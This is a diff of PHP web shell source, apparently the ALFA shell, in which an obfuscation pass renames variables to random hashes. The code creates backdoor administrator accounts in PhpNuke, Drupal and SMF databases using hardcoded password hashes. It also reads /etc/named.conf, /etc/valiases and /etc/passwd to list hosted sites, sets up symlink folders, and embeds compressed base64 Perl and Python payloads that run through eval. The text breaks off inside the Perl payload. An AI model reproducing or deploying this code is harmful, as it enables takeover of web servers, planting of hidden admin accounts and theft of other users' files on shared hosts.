 echo __pre().'<center><div class="txtfont_header">| PhpNuke |</div><p><p>'.getConfigHtml('phpnuke').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'nuke\',this.email.value,this.prefix.value); return false;" method="POST">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
@@ -4154,27 +4227,27 @@ $table = array('td1' =>
  'td8' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
 if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa4'];
-$password = $_POST['alfa5'];
-$admin = $_POST['alfa7'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$hash = md5($pwd);
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
+$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
+$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa4'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa5'];
+$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa7'];
+$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$horyspio0800fc577294c34e0b28ad2839435945 = md5($mevhntrj9003d1df22eb4d3820015070385194c8);
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."_authors(aid,name,email,pwd) values('$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','God','$vdhryjes9778840a0100cb30c982876741b0b5a2','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
+__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
 }
 }
 if(isset($_POST['alfa9']) && $_POST['alfa9'] == 'drupal'){
 
 echo __pre().'<center><div class="txtfont_header">| Drupal |</div><p><p>'.getConfigHtml('drupal').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,null,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'drupal\'); return false;" method="POST">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName'=> 'database', 'inputValue' => '', 'inputSize' => '50'),
@@ -4187,36 +4260,36 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true)
  );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
 if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa4'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$admin = $_POST['alfa8'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$getDescuid = @mysqli_query($conn,"select uid from users order by uid desc limit 0,1");
-$getDescuid = @mysqli_fetch_assoc($getDescuid);
-$getDescuid = $getDescuid['uid'];
-$getdescuid = $getDescuid++;
-$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','solevisible@fbi.gov','filtered_html','1','Europe/Berlin','solevisible@fbi.gov')") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
-$sole = mysqli_num_rows($solevisible);
-if ($sole == 1){
-$solevis = mysqli_fetch_assoc($solevisible);
-$res = $solevis['uid'];
+$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
+$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa4'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
+$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$hkxwhfiabf66ebc624fcb9e499d769c461f26dbd = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select uid from users order by uid desc limit 0,1");
+$hkxwhfiabf66ebc624fcb9e499d769c461f26dbd = @mysqli_fetch_assoc($hkxwhfiabf66ebc624fcb9e499d769c461f26dbd);
+$hkxwhfiabf66ebc624fcb9e499d769c461f26dbd = $hkxwhfiabf66ebc624fcb9e499d769c461f26dbd['uid'];
+$ikeymybsd5301ded65f8f32e704080de3a3014f1 = $hkxwhfiabf66ebc624fcb9e499d769c461f26dbd++;
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$hkxwhfiabf66ebc624fcb9e499d769c461f26dbd','$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','solevisible@fbi.gov','filtered_html','1','Europe/Berlin','solevisible@fbi.gov')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select uid from users where name='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$nuabiabibeb7f7a395dc21ad97425bbc061afbaf = mysqli_num_rows($syosrpmxd4a590caacc0be55ef286e40a945ea45);
+if ($nuabiabibeb7f7a395dc21ad97425bbc061afbaf == 1){
+$aqewfoiib3cd6a16f46d7fa04280495810dee6d7 = mysqli_fetch_assoc($syosrpmxd4a590caacc0be55ef286e40a945ea45);
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $aqewfoiib3cd6a16f46d7fa04280495810dee6d7['uid'];
 }
-$solevisible=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"INSERT INTO users_roles (uid,rid) VALUES ('".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."', '3')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
+__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
 }
 }
 
 if(isset($_POST['alfa10']) && $_POST['alfa10'] == 'smf'){
 
 echo __pre().'<center><center><div class="txtfont_header">| SMF |</div><p><p>'.getConfigHtml('smf').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,null,this.username.value,this.password.value,this.prefix.value,this.admin.value,null,\'smf\'); return false;" method="POST">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
@@ -4231,20 +4304,20 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
  );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
 if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$prefix = $_POST['alfa7'];
-$admin = $_POST['alfa8'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$setpwAlg = sha1(strtolower($admin) . 'solevisible');
-$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','solevisible@fbi.gov')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
+$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
+$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa7'];
+$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$uysompuo1f0ba54a6dd9957d3c9eec8eeb3228a8 = sha1(strtolower($qmgjkvzo21232f297a57a5a743894a0e4a801fc3) . 'solevisible');
+$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','1','$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','$uysompuo1f0ba54a6dd9957d3c9eec8eeb3228a8','solevisible@fbi.gov')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
+__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
 }
 }
 echo "</div>";
@@ -4254,35 +4327,35 @@ function alfaMakePwd(){
 	if(_alfa_file_exists("/etc/virtual/domainowners")||(_alfa_file_exists("/etc/named.conf")&&_alfa_file_exists("/etc/valiases"))){
 		return "/home/{user}/public_html/";
 	}
-	$document = explode("/", $_SERVER["DOCUMENT_ROOT"]);
-	$public = end($document);
-	array_pop($document);
-	array_pop($document);
-	$path = implode("/", $document) . "/{user}/" . $public;
-	return $path;
+	$hzesmpowfdc3bdefb79cec8eb8211d2499e04704 = explode("/", $_SERVER["DOCUMENT_ROOT"]);
+	$twsccpoy4c9184f37cff01bcdc32dc486ec36961 = end($hzesmpowfdc3bdefb79cec8eb8211d2499e04704);
+	array_pop($hzesmpowfdc3bdefb79cec8eb8211d2499e04704);
+	array_pop($hzesmpowfdc3bdefb79cec8eb8211d2499e04704);
+	$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = implode("/", $hzesmpowfdc3bdefb79cec8eb8211d2499e04704) . "/{user}/" . $twsccpoy4c9184f37cff01bcdc32dc486ec36961;
+	return $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
 }
-function alfaGetDomains($state = false){
-	$state = "named.conf";
-	$lines = array();
-	$lines = _alfa_file('/etc/named.conf');
-	if(!$lines){
-		$lines = @scandir("/etc/valiases/");
-		$state = "valiases";
-		if(!$lines){
-			$lines = @scandir("/var/named");
-			$state = "named";
-			if(!$lines && $state){
-				$lines = _alfa_file('/etc/passwd');
-				$state = "passwd";
+function alfaGetDomains($vrvwwpml9ed39e2ea931586b6a985a6942ef573e = false){
+	$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = "named.conf";
+	$rotcxius980da98409d058c365664ff7ea33dd6b = array();
+	$rotcxius980da98409d058c365664ff7ea33dd6b = _alfa_file('/etc/named.conf');
+	if(!$rotcxius980da98409d058c365664ff7ea33dd6b){
+		$rotcxius980da98409d058c365664ff7ea33dd6b = @scandir("/etc/valiases/");
+		$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = "valiases";
+		if(!$rotcxius980da98409d058c365664ff7ea33dd6b){
+			$rotcxius980da98409d058c365664ff7ea33dd6b = @scandir("/var/named");
+			$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = "named";
+			if(!$rotcxius980da98409d058c365664ff7ea33dd6b && $vrvwwpml9ed39e2ea931586b6a985a6942ef573e){
+				$rotcxius980da98409d058c365664ff7ea33dd6b = _alfa_file('/etc/passwd');
+				$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = "passwd";
 			}
 		}
 	}
-	return array("lines" => $lines, "state" => $state);
+	return array("lines" => $rotcxius980da98409d058c365664ff7ea33dd6b, "state" => $vrvwwpml9ed39e2ea931586b6a985a6942ef573e);
 }
 function alfaCreateParentFolder(){
-	$parent = $GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__;
-	if(!@is_dir($parent)){
-		@mkdir($parent, 0755, true);
+	$oyidytwkd0e45878043844ffc41aac437e86b602 = $GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__;
+	if(!@is_dir($oyidytwkd0e45878043844ffc41aac437e86b602)){
+		@mkdir($oyidytwkd0e45878043844ffc41aac437e86b602, 0755, true);
 	}
 }
 function alfasymlink(){
@@ -4292,28 +4365,28 @@ alfaCreateParentFolder();
 @chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
 echo '<div class=header><br><center><div class="txtfont_header">| Symlink |</div><center><h3><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symphp\')">| Symlink( php ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symperl\')">| Symlink( perl ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'sympy\')">| Symlink( python ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a></h3></center>';
 if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
-	$sympath = alfaMakePwd();
+	$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c = alfaMakePwd();
 	@mkdir('cgialfa',0755);
 	@chdir('cgialfa');
 	alfacgihtaccess('cgi');
-	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $alfa_data="'.__ALFA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
-	$py = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
-	$cginame = "symperl.alfa";
-	$source = $perl;
-	$lang = "perl";
+	$pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80 = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $alfa_data="'.__ALFA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("H4sIAAAAAAAA/50Ye1PTSPyrLLFnEqV5VBBs2gKH4jmjciPoP5TrbLLbNpImuez2Zamf/X77SBqgoHOZId3N/t7vZcooirKUcZxy9OFicPr+A+r20A5dxIwz1Dj58v7blXcdTJaoMWv5qIsMQ21CtY6HyFJ4NlrlRQxkjNMs5TTlTb7MaRtxuuDumE+SftpPO2LR64wpJr0Oj3lCe6cZoQSFS3Ty8ewEXdKTTx1XnXQYX8IPXgkSTUKjrMA8ztJ2mqU0WHdcdd5xFbkwI0sUjqIsyYqu+cyTj9kzAiWW2SHxDEmUrpFjQuJ01Pa9fBEEE1yM4rQZZpxnE/UtzApCi7afLxDBbAwSPhvKJ5D027AT5AMpGk7iUdqOQGdaBEPQvjmn8WjM22GWEPWBxT9ou/UaKBsbjVmWUMQwQc9RnM5iFoew/4kulpMkTm/Qn0v0Ny2SjguC98xgTRNGV9oNlWeUJxo4GeIBwRw7hhuNYrF1jWDNpiGQHuCiwEu0AsdZgO/tNma+ZwPa8UA484+ZP4TNBOdo1RgI//trdCwAg4LyaZEiS8UDIPvDlUBe2/aR3/YUg3xOStqvNdV4aO3osFhpGkLwYA0HAIXov8ggcUEjblQAhjvOJtRdTRkt1m4+DZM4Goh4EYoAXpMCCOWRm+IJJQ6E7dBAz5+jJtHfZ+AHzChzf5PmMcuTmIPA8tdy+667ixrvPn9bGW/PT79+evf5cvDl/PzSWNsq5g8ANs9ypBCD2lKz+57FqWW4xq7+bjsggWZuIAcoKItN8A3lRWm0PeA6o+LlH4r3vjaiTqcOQKqwNR9GmwlpBLEvYgyVkX8Gj+dD5APDPcfouOIU0kQAcrKFVkKHXFDCaFzQYdc0HJCKSiddHYnn2kBHyPyOZ5hFRZzzNk5owS1jDtVDVI5hnBJEsgmOU8dxDNtsI3PMed52XROEoLZjmIhDllHeNQdhgtMb857QnnfSanlKaFoTGleCb9Hy7Ewh+IcP1KxrAzniGCIlmMosV6xzSC2HL7g43oes+ZWAYFNZT3R2PhDQ5UVPZxzJBsDpfk7IEPJfiRiaE/ldfDqe+fvwydKbqLZ+Va0bMwJrX5OApaeWbzZLb7P0FUQt1WTGQFaoY8FDfwqynEJ6E0+4ju0i816CmTbKigqnTDAj0FJ3NGIviJIMWoneKtaAI3hXSCV7IbR5N2FNKQcUBKQaTWtXASreB1J3zbKgonQXEurOueJ5cJfLDBdKm6c5+L/g4JccdsTGXiknQDmDB6rytqK21bCzuOBTnLgqVbJ5SgtWmfiOEE9b1tdaHtacXjOr5vK